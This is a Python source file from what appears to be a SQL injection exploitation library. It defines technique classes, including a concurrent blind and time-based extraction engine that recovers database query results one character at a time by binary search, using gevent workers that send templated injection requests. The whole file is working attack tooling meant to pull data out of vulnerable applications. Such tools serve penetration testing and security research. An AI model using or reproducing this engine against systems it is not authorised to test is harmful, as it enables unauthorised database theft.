#file: technique.py

from . import debug
from .truth import Truth
from .settings import *
from .exceptions import *

import gevent
from gevent.event import AsyncResult,Event
from gevent.queue import Queue
from gevent.pool import Pool
from copy import copy


class Technique(object):
    '''
    This is a sql injection teqnique. Eg. Union based or Time based... Techniques need
    to implement at minimum the run method which is what actually launches the technique.
    Techniques will usually also take a user_query (query we are trying to run on the db).
    The class init init will (almost?) always take a make_request_func as a param. This
    option specifies the function to call to make an actual request. 
    '''
    def __init__(self,make_request_func,query):
        self.query = query
        self.make_request_func = make_request_func

        if type(self) == Technique:
            raise NotImplemented

    def run(self):
        '''
        run the exploit
        '''
        raise NotImplemented("technique.run")



class Character():
    def __init__(self,row_index,char_index,queue,row_die):
        self.row_index = row_index
        self.char_index = char_index
        self.q = queue
        self.row_die = row_die
        self.char_val = CHARSET[0]
        self.error = False
        self.working = False
        self.done = False
    
    def run(self):
        low = 0
        high = CHARSET_LEN
        self.working = True
        
        #binary search unless we hit an error
        while low < high and not self.error and self.working:
            mid = (low+high)//2
            self.char_val = CHARSET[mid]
            if self._test("<"):
                #print "data[%d][%d] > %s (%d)" % (self.row_index,self.char_index,CHARSET[mid],ord(CHARSET[mid]))
                high = mid
            elif self._test(">"):
                #print "data[%d][%d] < %s (%d)" % (self.row_index,self.char_index,CHARSET[mid],ord(CHARSET[mid]))
                low = mid + 1
            elif low < CHARSET_LEN and self._test("="):
                #print "data[%d][%d] = %s (%d)" % (self.row_index,self.char_index,CHARSET[mid],ord(CHARSET[mid]))
                self.working = False
            else:
                #if there isn't a value for the character we are working on, that means we went past the end of the row.
                #we set error and kill characters after us in the row.
                self.error = True
                self.row_die.set(self.char_index)

            if self.row_die.ready() and self.row_die.get() < self.char_index:
                #print "results[%d][%d] got killed" % (self.row_index,self.char_index)
                self.error = True
            
        self.done = True
        self.working = False
    
    def _test(self,comparator):
        asr = AsyncResult()
        self.q.put(item=(self.row_index,self.char_index,self.char_val,comparator,asr))
        return asr.get()

    def __eq__(self,y):
        if y == "error":
            return self.error
        
        if y == "working":
            return self.working
        
        if y == "success":
            return self.done and not self.error

    def __str__(self):
        if (not self.working) and (not self.error): return self.char_val
        if self.error: return ""
        if self.working: return self.char_val

    def __repr__(self):
        if (not self.working) and (not self.done): return "not_started"
        if (not self.error) and self.done: return self.char_val
        if self.error: return ""
        if self.working: return self.char_val
    

class BlindTechniqueConcurrent(Technique):
    def __init__(self,truth = Truth(), *args, **kwargs):
        self.truth = truth
        self.rungl = None

        super(BlindTechniqueConcurrent,self).__init__(*args,**kwargs)

    def _request_maker(self):
        '''
        this runs in a gevent "thread". It is a worker
        '''
        #keep going until we shut down the technique
        while True:
            #pull the info needed to make a request from the queue
            row_index,char_index,char_val,comparator,char_asyncresult = self.q.get()

            #build out our query object
            query = copy(self.query)
            query.set_option('user_query',self.user_query)
            query.set_option('row_index',str(row_index))
            query.set_option('char_index',str(char_index))
            query.set_option('char_val',str(ord(char_val)))
            query.set_option('sleep',str(self.sleep))
            query.set_option('comparator',comparator)
            query_string = query.render()

            char_asyncresult.set(self.truth.test(self.make_request_func(query_string)))

    def _reset(self):
        '''
        reset all the variables used for keeping track of internal state
        '''
        #an list of Character()s 
        self.results = []
        #an list of strings
        self.str_results = []
        #character generators take care of building the Character objects. we need one per row
        self.char_gens = []
        #make a row_generator
        self.row_gen = self._row_generator()
        #a queue for communications between Character()s and request_makers
        self.q = Queue()
        #"threads" that run the Character()s
        self.character_pool = Pool(self.concurrency)
        #"threads" that make requests
        self.request_makers = [gevent.spawn(self._request_maker) for i in range(self.concurrency)]

    def _row_generator(self):
        '''
        crease rows. mostly useful because it keeps track of row_index
        '''
        row_index = 0
        while True:
            self.char_gens.append(self._character_generator(row_index))
            self.results.append([])
            yield True
            row_index += 1

    def _add_rows(self):
        '''
        look at how many gevent "threads" are being used and add more rows to correct this
        '''
        if self._more_rows():
            '''unused_threads = self.concurrency - sum([row.count('working') for row in self.results])
            rows_needed = unused_threads//self.row_len
            rows_needed = [rows_needed,1][rows_needed == 0 and unused_threads > 0]
            [self.row_gen.next() for i in xrange(rows_needed)]'''
            self.row_gen.next()

    def _character_generator(self,row_index):
        '''
        creates a Character object for us. this generator is useful just because it keeps track of the char_index
        '''
        char_index = 1
        row_die_event = AsyncResult()
        while True:
            c = Character(\
                row_index   = row_index,\
                char_index  = char_index,\
                queue       = self.q,\
                row_die     = row_die_event)
            char_index += 1
            #fire off the Character within our Pool.
            self.character_pool.spawn(c.run)
            yield c

    def _adjust_row_lengths(self):
        ''' 
        if a row is full of "success", but we havent reached the end yet (the last elt isnt "error")
        then we need to increase the row_len.
        '''
        for row in self.results:
            if row.count('success') == len(row) and len(row) == self.row_len:
                self.row_len += 1
        
        for row_index in range(len(self.results)):
            row = self.results[row_index]
            #if the row isn't finished or hasn't been started yet, we add Character()s to the row
            if len(row) == 0 or row[-1] != "error":
                self.results[row_index] += [self.char_gens[row_index].next() for i in range(self.row_len - len(row))]

    def _keep_going(self):
        '''
        Look at the results gathered so far and determine if we should keep going. we want to keep going until we have an empty row
        '''
        if len(self.results) == 0: 
            return True
        for row in self.results:
            if row.count("error") == 0:
                return True
            if len(row) > 0 and row.count("error") == len(row): 
                return False
        return True

    def _more_rows(self):
        '''decide if we need to create more rows. you might want to override this...'''
        if len(self.results) == 0: return True
        rval = (not filter(lambda row:row.count('error') == len(row) and len(row) > 0,self.results))
        return rval

    def _run(self):
        while self._keep_going():     
            #print self.q.qsize()
            # adjust self.row_len and the lengths of rows if necessary
            self._adjust_row_lengths()
            # add more rows if we need to
            self._add_rows()
            # sleeping for 0 is the same as yielding to other coroutines without sleeping
            gevent.sleep(0)

        self.character_pool.join()
        gevent.killall(self.request_makers)

    def run(self,user_query,concurrency=20,row_len=2,sleep=0):
        '''
        run the exploit. returns the data retreived.
            :user_query     this is the query whose result we are trying to get out of the vulnerable application. 
            :concurrency    how many gevent "threads" to use. This is useful for throttling the attack.
            :row_len        An estimated starting point for the length of rows. This will get adjusted as the attack goes on.
            :sleep          if this is time based blind SQLi, then we will need to know how much to tell the DB to sleep.
        '''
        if self.rungl != None:
            self.rungl.kill()

        self.row_len = row_len
        self.sleep = sleep
        self.user_query = user_query
        self.concurrency = concurrency

        #start fresh
        self._reset()

        self.rungl = gevent.spawn(self._run)
        return self.rungl

    def get_results(self):
        return ["".join([str(x) for x in row]) for row in self.results]